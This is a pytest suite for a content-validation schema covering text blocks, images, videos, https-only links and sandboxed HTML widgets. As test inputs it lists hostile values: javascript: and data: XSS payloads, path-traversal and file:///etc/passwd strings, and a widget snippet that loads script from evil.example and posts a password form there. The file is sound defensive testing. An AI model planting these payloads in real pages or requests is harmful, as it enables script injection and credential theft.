"""The rules of bubble content: every block, the widget, and hostile inputs."""

import copy
import uuid
from typing import Any

import pytest

from app.exceptions import ContentInvalidError, ContentTooLargeError
from app.schemas.content import (
    MAX_BLOCKS,
    MAX_BLOCKS_BODY_BYTES,
    MAX_WIDGET_HTML_BYTES,
    BlocksContent,
    WidgetContent,
    clean_text,
    image_asset_ids,
    parse_content,
    stored_size,
    to_stored,
)

ASSET = "0197a2b4-5c6d-7e8f-9a0b-1c2d3e4f5a6b"


def blocks(*items: dict[str, Any], **content: Any) -> dict[str, Any]:
    return {
        "type": "blocks",
        "title": "Introduccion",
        "autoOpen": "never",
        "body": {"schemaVersion": 1, "blocks": list(items)},
        **content,
    }


def widget(**fields: Any) -> dict[str, Any]:
    return {
        "type": "widget",
        "title": "Simulador",
        "autoOpen": "first_visit",
        "altText": "Un simulador de circuitos",
        "html": "<h1>hola</h1><script>1</script>",
        **fields,
    }


def problems_of(raw: object) -> list[tuple[str, str]]:
    with pytest.raises(ContentInvalidError) as caught:
        parse_content(raw)
    return [(p["path"], p["code"]) for p in caught.value.problems]


def one_block(block: dict[str, Any]) -> list[tuple[str, str]]:
    return problems_of(blocks(block))


# --- a valid example of everything ------------------------------------------------


def test_every_block_type_is_accepted_and_stored_in_camel_case() -> None:
    raw = blocks(
        {"type": "heading", "text": "Bienvenida", "level": 2},
        {"type": "paragraph", "text": "Linea uno\nLinea dos"},
        {"type": "image", "assetId": ASSET, "alt": "Un mapa", "caption": "Fig. 1"},
        {
            "type": "video",
            "provider": "youtube",
            "videoId": "dQw4w9WgXcQ",
            "title": "V",
        },
        {"type": "link", "text": "Mas", "url": "https://example.com/a?b=c#d"},
        {"type": "divider"},
    )

    content = parse_content(raw)

    assert isinstance(content, BlocksContent)
    assert to_stored(content) == raw
    assert image_asset_ids(to_stored(content)) == [uuid.UUID(ASSET)]


def test_a_widget_is_accepted_and_its_html_is_kept_byte_for_byte() -> None:
    html = '<!doctype html><script>alert("x")</script>\r\n<style>*{}</style> é '
    content = parse_content(widget(html=html))

    assert isinstance(content, WidgetContent)
    assert to_stored(content)["html"] == html


def test_auto_open_defaults_to_never_and_optional_caption_is_left_out() -> None:
    raw = blocks({"type": "image", "assetId": ASSET, "alt": "x"})
    del raw["autoOpen"]

    stored = to_stored(parse_content(raw))

    assert stored["autoOpen"] == "never"
    assert "caption" not in stored["body"]["blocks"][0]


def test_an_empty_caption_is_the_same_as_none() -> None:
    raw = blocks({"type": "image", "assetId": ASSET, "alt": "x", "caption": "  "})

    assert "caption" not in to_stored(parse_content(raw))["body"]["blocks"][0]


def test_a_content_with_no_blocks_is_valid() -> None:
    assert to_stored(parse_content(blocks()))["body"]["blocks"] == []


# --- the envelope -------------------------------------------------------------------


@pytest.mark.parametrize("raw", [None, [], "blocks", 3, {}])
def test_content_must_be_an_object_with_a_type(raw: object) -> None:
    assert problems_of(raw)  # reported, never a crash


def test_an_unknown_content_type_is_reported() -> None:
    assert problems_of({"type": "script"}) == [("", "unknown_type")]


def test_unknown_fields_are_rejected_everywhere() -> None:
    raw = blocks({"type": "divider", "extra": 1}, extra="x")
    raw["body"]["more"] = 1

    assert set(problems_of(raw)) == {
        ("extra", "unknown_field"),
        ("body.more", "unknown_field"),
        ("body.blocks[0].extra", "unknown_field"),
    }


def test_only_the_camel_case_spelling_is_accepted() -> None:
    raw = widget()
    raw["alt_text"] = raw.pop("altText")

    assert set(problems_of(raw)) == {
        ("altText", "required"),
        ("alt_text", "unknown_field"),
    }


@pytest.mark.parametrize("title", ["", "   ", "x" * 121, 5, None])
def test_the_title_is_one_to_120_characters(title: object) -> None:
    assert problems_of(blocks(title=title))


def test_the_title_at_its_limit_is_fine() -> None:
    assert parse_content(blocks(title="x" * 120))


def test_auto_open_must_be_a_known_value() -> None:
    assert problems_of(blocks(autoOpen="always")) == [("autoOpen", "invalid_value")]


@pytest.mark.parametrize("version", [2, 0, "1", 1.0, True, None])
def test_the_schema_version_must_be_exactly_one(version: object) -> None:
    raw = blocks()
    raw["body"]["schemaVersion"] = version

    assert problems_of(raw)


def test_the_body_needs_blocks() -> None:
    raw = blocks()
    del raw["body"]["blocks"]

    assert problems_of(raw) == [("body.blocks", "required")]


# --- headings and paragraphs ----------------------------------------------------------


@pytest.mark.parametrize("level", [1, 4, 0, "2", 2.0, True, None])
def test_a_heading_level_is_two_or_three(level: object) -> None:
    assert one_block({"type": "heading", "text": "T", "level": level})


@pytest.mark.parametrize("level", [2, 3])
def test_heading_levels_two_and_three_pass(level: int) -> None:
    assert parse_content(blocks({"type": "heading", "text": "T", "level": level}))


def test_heading_text_is_one_to_120_characters() -> None:
    ok = {"type": "heading", "text": "x" * 120, "level": 2}
    assert parse_content(blocks(ok))
    assert one_block({**ok, "text": "x" * 121}) == [("body.blocks[0].text", "too_long")]
    assert one_block({**ok, "text": " \n "}) == [("body.blocks[0].text", "too_short")]


def test_paragraph_text_is_up_to_1500_characters() -> None:
    ok = {"type": "paragraph", "text": "x" * 1500}
    assert parse_content(blocks(ok))
    assert one_block({**ok, "text": "x" * 1501}) == [
        ("body.blocks[0].text", "too_long")
    ]


def test_the_length_is_counted_after_cleaning() -> None:
    padded = "x" * 120 + "\x00\x01\u202e " * 10  # over by bytes, not by text
    assert parse_content(blocks({"type": "heading", "text": padded, "level": 2}))


def test_a_paragraph_keeps_its_newlines_and_a_heading_does_not() -> None:
    paragraph = parse_content(blocks({"type": "paragraph", "text": "a\r\nb\rc\n\nd"}))
    heading = parse_content(blocks({"type": "heading", "text": "a\nb\tc", "level": 2}))

    assert to_stored(paragraph)["body"]["blocks"][0]["text"] == "a\nb\nc\n\nd"
    assert to_stored(heading)["body"]["blocks"][0]["text"] == "a b c"


def test_text_is_normalized_to_nfc() -> None:
    decomposed = "Café"

    stored = to_stored(parse_content(blocks({"type": "paragraph", "text": decomposed})))

    assert stored["body"]["blocks"][0]["text"] == "Café"


def test_control_and_direction_characters_are_removed() -> None:
    hostile = "a\x00b\x07c\x1b[31md\u202ee\u2066f\ufeffg\x7fh\ud800"

    assert clean_text(hostile, multiline=True) == "abc[31mdefgh"


def test_zero_width_joiners_survive_for_emoji() -> None:
    family = "\U0001f468‍\U0001f469‍\U0001f467"

    assert clean_text(family, multiline=False) == family


def test_markup_in_text_is_just_text() -> None:
    text = "<img src=x onerror=alert(1)> &amp; <script>"

    stored = to_stored(parse_content(blocks({"type": "paragraph", "text": text})))

    assert stored["body"]["blocks"][0]["text"] == text  # the client escapes it


@pytest.mark.parametrize("text", [None, 5, ["a"], {"a": 1}, b"abc"])
def test_text_must_be_a_string(text: object) -> None:
    assert one_block({"type": "paragraph", "text": text})


# --- images ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "asset_id", ["", "abc", "../../etc/passwd", 7, None, ASSET + "0"]
)
def test_an_image_needs_a_real_asset_id(asset_id: object) -> None:
    assert one_block({"type": "image", "assetId": asset_id, "alt": "x"})


def test_alt_text_is_required_and_bounded() -> None:
    base = {"type": "image", "assetId": ASSET}
    assert one_block(base) == [("body.blocks[0].alt", "required")]
    assert one_block({**base, "alt": "  "}) == [("body.blocks[0].alt", "too_short")]
    assert parse_content(blocks({**base, "alt": "x" * 200}))
    assert one_block({**base, "alt": "x" * 201}) == [("body.blocks[0].alt", "too_long")]


def test_a_caption_is_bounded() -> None:
    base = {"type": "image", "assetId": ASSET, "alt": "x"}
    assert parse_content(blocks({**base, "caption": "x" * 200}))
    assert one_block({**base, "caption": "x" * 201}) == [
        ("body.blocks[0].caption", "too_long")
    ]


def test_the_asset_ids_of_the_images_are_listed_once_in_order() -> None:
    other = "0197a2b4-5c6d-7e8f-9a0b-1c2d3e4f5a6c"
    image = {"type": "image", "alt": "x"}
    stored = to_stored(
        parse_content(
            blocks(
                {**image, "assetId": other},
                {**image, "assetId": ASSET},
                {**image, "assetId": other},
            )
        )
    )

    assert image_asset_ids(stored) == [uuid.UUID(other), uuid.UUID(ASSET)]
    assert image_asset_ids(to_stored(parse_content(widget()))) == []
    assert image_asset_ids(None) == []


# --- videos: a provider and an id, never a URL ------------------------------------------


@pytest.mark.parametrize("provider", ["youtube", "vimeo"])
def test_the_two_providers_are_accepted(provider: str) -> None:
    block = {
        "type": "video",
        "provider": provider,
        "videoId": "abc_DEF-123",
        "title": "T",
    }
    assert parse_content(blocks(block))


@pytest.mark.parametrize(
    "provider",
    ["dailymotion", "YouTube", "youtube.com", "", "javascript", None, 1, "vimeo "],
)
def test_other_providers_are_refused(provider: object) -> None:
    block = {"type": "video", "provider": provider, "videoId": "abcdef", "title": "T"}
    assert one_block(block)


@pytest.mark.parametrize(
    "video_id",
    [
        "short",  # 5
        "a" * 33,
        "abc def",
        "abcdef\n",
        "\nabcdef",
        " abcdef",
        "abcdef ",
        "abc.def",
        "abc/def",
        "https://youtu.be/dQw4w9WgXcQ",
        "www.youtube.com/watch?v=abcdef",
        "abcеdef",  # Cyrillic e
        "abcdef\x00",
        "<script>",
        "",
        None,
        123456,
    ],
)
def test_a_video_id_is_only_letters_digits_dash_underscore(video_id: object) -> None:
    block = {"type": "video", "provider": "youtube", "videoId": video_id, "title": "T"}
    assert one_block(block)


@pytest.mark.parametrize("video_id", ["abcdef", "a" * 32, "A_b-C_d-E", "000000"])
def test_valid_video_ids(video_id: str) -> None:
    block = {"type": "video", "provider": "vimeo", "videoId": video_id, "title": "T"}
    assert parse_content(blocks(block))


def test_a_video_never_takes_a_free_url() -> None:
    block = {
        "type": "video",
        "provider": "youtube",
        "videoId": "abcdef",
        "title": "T",
        "url": "https://www.youtube.com/embed/abcdef",
    }
    assert one_block(block) == [("body.blocks[0].url", "unknown_field")]


def test_a_video_needs_a_bounded_title() -> None:
    block = {"type": "video", "provider": "youtube", "videoId": "abcdef"}
    assert one_block(block) == [("body.blocks[0].title", "required")]
    assert one_block({**block, "title": "x" * 121}) == [
        ("body.blocks[0].title", "too_long")
    ]


# --- links: https only ------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://example.com",
        "https://example.com/",
        "https://sub.example.co.uk:8443/a/b?c=d&e=f#g",
        "HTTPS://EXAMPLE.COM/PATH",
        "https://es.wikipedia.org/wiki/Educación",
        "https://xn--bcher-kva.example/",
        "https://127.0.0.1/",
    ],
)
def test_https_links_are_accepted(url: str) -> None:
    assert parse_content(blocks({"type": "link", "text": "ir", "url": url}))


@pytest.mark.parametrize(
    "url",
    [
        # other schemes
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "java\nscript:alert(1)",
        "java\tscript:alert(1)",
        "jav&#x61;script:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD4=",
        "vbscript:msgbox(1)",
        "file:///etc/passwd",
        "ftp://example.com/",
        "http://example.com/",
        "ws://example.com/",
        "blob:https://example.com/uuid",
        "mailto:a@b.co",
        "tel:123",
        # not absolute
        "//example.com/",
        "/relative/path",
        "example.com",
        "www.example.com",
        "https:example.com",
        "https:/example.com",
        "https:///example.com",
        "https://",
        "https:",
        "",
        # credentials
        "https://user@example.com/",
        "https://user:pass@example.com/",
        "https://example.com@evil.com/",
        "https://example.com:pass@evil.com/",
        "https://@example.com/",
        # whitespace and control tricks
        " https://example.com",
        "https://example.com ",
        "\nhttps://example.com",
        "https://example.com\n",
        "https://exa mple.com",
        "https://example.com/a b",
        "https://example.com/\x00",
        "https://example.com/\x1f",
        "https://example.com\u00a0",
        "https://example.com/\u2028",
        "https://example.com/\u202e",
        "https://example.com/\u200b",
        "\u00a0https://example.com",
        # confusing hosts and paths
        "https://example.com\\@evil.com/",
        "https:\\\\example.com",
        "https://еxample.com/",  # Cyrillic e: use punycode
        "https://exa\u3002mple.com/",  # ideographic full stop
        "https://-example.com/",
        "https://example.com./.",
        "https://[::1]/",
        "https://example.com:0/",
        "https://example.com:99999/",
        "https://example.com:abc/",
        # markup breakers
        'https://example.com/"onmouseover="x',
        "https://example.com/<script>",
        "https://example.com/`",
        # over-long
        "https://example.com/" + "a" * 2000,
    ],
)
def test_hostile_links_are_refused(url: str) -> None:
    assert one_block({"type": "link", "text": "ir", "url": url}) == [
        ("body.blocks[0].url", "invalid_url")
    ]


@pytest.mark.parametrize("url", [None, 5, ["https://a.co"], {"u": 1}, b"https://a.co"])
def test_a_link_url_must_be_a_string(url: object) -> None:
    assert one_block({"type": "link", "text": "ir", "url": url})


def test_a_link_at_the_url_limit_is_accepted() -> None:
    url = "https://example.com/" + "a" * (2000 - len("https://example.com/"))
    assert len(url) == 2000
    assert parse_content(blocks({"type": "link", "text": "ir", "url": url}))


def test_link_text_is_one_to_80_characters() -> None:
    link = {"type": "link", "url": "https://example.com"}
    assert parse_content(blocks({**link, "text": "x" * 80}))
    assert one_block({**link, "text": "x" * 81}) == [
        ("body.blocks[0].text", "too_long")
    ]
    assert one_block({**link, "text": ""}) == [("body.blocks[0].text", "too_short")]


# --- blocks in general --------------------------------------------------------------------


@pytest.mark.parametrize(
    "block",
    [
        {},
        {"type": "html"},
        {"type": "script", "src": "x"},
        {"type": None},
        "p",
        3,
        None,
    ],
)
def test_an_unknown_block_type_is_reported_at_its_position(block: object) -> None:
    problems = problems_of(blocks({"type": "divider"}, block))  # type: ignore[arg-type]

    assert problems and all(path.startswith("body.blocks[1]") for path, _ in problems)


def test_forty_blocks_pass_and_forty_one_do_not() -> None:
    divider = {"type": "divider"}
    assert parse_content(blocks(*[divider] * MAX_BLOCKS))
    assert problems_of(blocks(*[divider] * (MAX_BLOCKS + 1))) == [
        ("body.blocks", "too_many_blocks")
    ]


def test_every_problem_is_reported_not_just_the_first() -> None:
    raw = blocks(
        {"type": "heading", "text": "", "level": 9},
        {"type": "link", "text": "x", "url": "javascript:1"},
        title="",
    )

    assert set(problems_of(raw)) == {
        ("title", "too_short"),
        ("body.blocks[0].text", "too_short"),
        ("body.blocks[0].level", "invalid_value"),
        ("body.blocks[1].url", "invalid_url"),
    }


def test_messages_never_echo_the_input() -> None:
    secret = "javascript:SECRET-TOKEN"
    with pytest.raises(ContentInvalidError) as caught:
        parse_content(blocks({"type": "link", "text": "x", "url": secret}))

    assert "SECRET-TOKEN" not in repr(caught.value.problems)


def test_the_body_of_blocks_is_limited_to_20_kb() -> None:
    paragraph = {"type": "paragraph", "text": "á" * 1500}  # 3000 bytes each
    seven = blocks(*[paragraph] * 7)  # 21000 bytes
    six = blocks(*[paragraph] * 6)  # 18000 bytes

    assert parse_content(six)
    with pytest.raises(ContentTooLargeError) as caught:
        parse_content(seven)
    assert (caught.value.limit_bytes, caught.value.scope) == (
        MAX_BLOCKS_BODY_BYTES,
        "bubble",
    )


# --- widgets ------------------------------------------------------------------------------


def test_a_widget_needs_every_field() -> None:
    for field in ("title", "altText", "html"):
        raw = widget()
        del raw[field]
        assert problems_of(raw) == [(field, "required")]


def test_a_widget_needs_a_real_alt_text() -> None:
    assert problems_of(widget(altText="")) == [("altText", "too_short")]
    assert problems_of(widget(altText="  \n")) == [("altText", "too_short")]
    assert parse_content(widget(altText="x" * 300))
    assert problems_of(widget(altText="x" * 301)) == [("altText", "too_long")]


def test_a_widget_cannot_carry_block_fields() -> None:
    assert problems_of(widget(body={"schemaVersion": 1, "blocks": []})) == [
        ("body", "unknown_field")
    ]


def test_blocks_cannot_carry_widget_fields() -> None:
    assert problems_of(blocks(html="<b>x</b>")) == [("html", "unknown_field")]


@pytest.mark.parametrize("html", ["", "   \n\t", None, 5, ["<b>"], b"<b>"])
def test_widget_html_must_be_non_empty_text(html: object) -> None:
    assert problems_of(widget(html=html))


@pytest.mark.parametrize("html", ["a\ud800b", "\udfff", "ok\x00nul"])
def test_widget_html_must_be_valid_utf8(html: str) -> None:
    assert problems_of(widget(html=html)) == [("html", "invalid_utf8")]


def test_widget_html_is_limited_to_200_kb_of_utf8() -> None:
    assert parse_content(widget(html="a" * MAX_WIDGET_HTML_BYTES))
    with pytest.raises(ContentTooLargeError) as caught:
        parse_content(widget(html="a" * (MAX_WIDGET_HTML_BYTES + 1)))
    assert (caught.value.limit_bytes, caught.value.scope) == (
        MAX_WIDGET_HTML_BYTES,
        "bubble",
    )
    # The limit is in bytes, not characters.
    assert parse_content(widget(html="á" * (MAX_WIDGET_HTML_BYTES // 2)))
    with pytest.raises(ContentTooLargeError):
        parse_content(widget(html="á" * (MAX_WIDGET_HTML_BYTES // 2 + 1)))


def test_the_server_does_not_touch_hostile_widget_html() -> None:
    html = (
        '<iframe src="javascript:1"></iframe><script src=//evil.example></script>'
        "<form action=//evil.example><input name=password></form>"
    )

    assert to_stored(parse_content(widget(html=html)))["html"] == html


# --- sizes -------------------------------------------------------------------------------


def test_stored_size_counts_utf8_bytes_and_ignores_key_order() -> None:
    a = {"b": "á", "a": 1}
    b = {"a": 1, "b": "á"}

    assert stored_size(a) == stored_size(b) == len('{"a":1,"b":"á"}'.encode())


def test_parsing_does_not_change_its_input() -> None:
    raw = blocks({"type": "paragraph", "text": "Café"})
    before = copy.deepcopy(raw)

    parse_content(raw)

    assert raw == before
